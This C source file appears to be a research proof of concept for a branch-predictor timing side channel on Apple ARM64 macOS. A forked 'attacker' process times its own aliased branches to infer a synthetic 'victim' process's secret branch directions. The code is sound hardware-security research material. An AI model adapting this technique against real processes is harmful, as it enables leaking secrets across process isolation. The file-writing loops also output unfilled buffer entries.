#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>

#include <string.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <_types/_uint32_t.h>

#include "./utils.c"

#define MAX_LINES 5000000
#define MAX_LINE_LENGTH 100

void f2(int input){
	if (input){
		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
	}
    else {
		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
    }
}

void f1(int input1, int input2, int flag){
	if (input1){
		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
        (void)(flag && (usleep(1000), 0));
        (void)(flag && (f2(input2), 0));
	}
    else {
		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
    }
}

int check_conjuring(){
    uint64_t t1, t2, latency;
    int testsize = 10;
    uint64_t *hit = (uint64_t *)malloc(sizeof(uint64_t) * testsize);
    uint64_t *miss = (uint64_t *)malloc(sizeof(uint64_t) * testsize);

    for (int i = 0; i < testsize; i++) {
        f1(0, 0, 0);
        asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
        asm volatile("dsb sy" ::: "memory");
        f1(0, 0, 0); // not-taken
        asm volatile("dsb sy" ::: "memory");
        asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
        hit[i] = t2 - t1;
        printf("[HIT]  Time (ns): %llu\n", hit[i]);
    }
    for (int i = 0; i < testsize; i++) {
        f1(1, 0, 0);
        asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
        asm volatile("dsb sy" ::: "memory");
        f1(0, 0, 0); // not-taken
        asm volatile("dsb sy" ::: "memory");
        asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
        miss[i] = t2 - t1;
        printf("[MISS] Time (ns): %llu\n", miss[i]);
    }

    print_histogram(hit, testsize, "HIT");
    print_histogram(miss, testsize, "MISS");
    free(hit);
    free(miss);
    return 0;
}

int main() {
    uint32_t CORE_ID = 0;
    volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
    if (ret == -1)
    {
        printf("Error setting CPU core affinity. Please run as root\n");
        return EXIT_FAILURE;
    }
    check_conjuring();
    
    pid_t pid = fork();

    if (pid < 0) {
        perror("fork failed");
        exit(1);
    } 
    else if (pid == 0) {
        // Child = Victim
        sleep(1);
        volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
        if (ret == -1)
        {
            printf("Error setting CPU core affinity. Please run as root\n");
            return EXIT_FAILURE;
        }

        char (*lines)[MAX_LINE_LENGTH] = malloc(sizeof(char[MAX_LINES][MAX_LINE_LENGTH]));
        if (!lines) {
            perror("malloc failed");
            return 1;
        }

        int testsec = 7; // not second. 1/clock speed
        srand(time(NULL));
        uint64_t now, start;
        int n = 0;
        
        FILE *fp = fopen("p1_nested.txt", "w");
        printf("[Victim] address of func1: %p\n", f1);

        asm volatile("mrs %[start], S3_2_c15_c0_0" : [start]"=r"(start));
        while(1) {
            usleep(10);
            int input = rand() % 2;

            asm volatile("mrs %[now], S3_2_c15_c0_0" : [now]"=r"(now));
            asm volatile("dsb sy" ::: "memory");
            f1(1, input, 1);
            asm volatile("dsb sy" ::: "memory");
            snprintf(lines[n++], MAX_LINE_LENGTH, "%llu, %d\n", now, input);
            if ((now - start) >= (uint64_t)testsec * 1000000000ULL) {
                break;
            }
        }

        for (int i = 0; i < MAX_LINES; ++i) {
            fputs(lines[i], fp);
        }
        fclose(fp);
        free(lines);
        printf("Victim(Child) End\n");
    } 
    else {
        // Parent = Attacker
        char (*lines)[MAX_LINE_LENGTH] = malloc(sizeof(char[MAX_LINES][MAX_LINE_LENGTH]));
        if (!lines) {
            perror("malloc failed");
            return 1;
        }

        uint64_t t1, t2, now, start;
        uint64_t latency;
        int testsec = 20; // not second. 1/clock speed
        int n = 0;

        FILE *fp = fopen("p2_nested.txt", "w");
        printf("[Spy] address of f1: %p\n", f1);

        asm volatile("mrs %[start], S3_2_c15_c0_0" : [start]"=r"(start));
        uint64_t previous = start;
        while(1) {		
            asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
            asm volatile("dsb sy" ::: "memory");
            f1(0, 0, 0); // b1 not-taken
            asm volatile("dsb sy" ::: "memory");
            asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
            latency = t2 - t1;
            snprintf(lines[n++], MAX_LINE_LENGTH, "[b1] %lld,%lld\n", t2, latency);
            
            asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
            asm volatile("dsb sy" ::: "memory");
            f2(0); // b2 not-taken
            asm volatile("dsb sy" ::: "memory");
            asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
            latency = t2 - t1;
            snprintf(lines[n++], MAX_LINE_LENGTH, "[b2] %lld,%lld\n", t2, latency);

            asm volatile("mrs %[now], S3_2_c15_c0_0" : [now]"=r"(now));
            previous = now;
            if ((now - start) >= (uint64_t)testsec * 1000000000ULL) {
                break;
            }
        }

        for (int i = 0; i < MAX_LINES; ++i) {
            fputs(lines[i], fp);
        }
        fclose(fp);
        free(lines);
        printf("Attacker(Parent) End\n");
    }

    return 0;
}
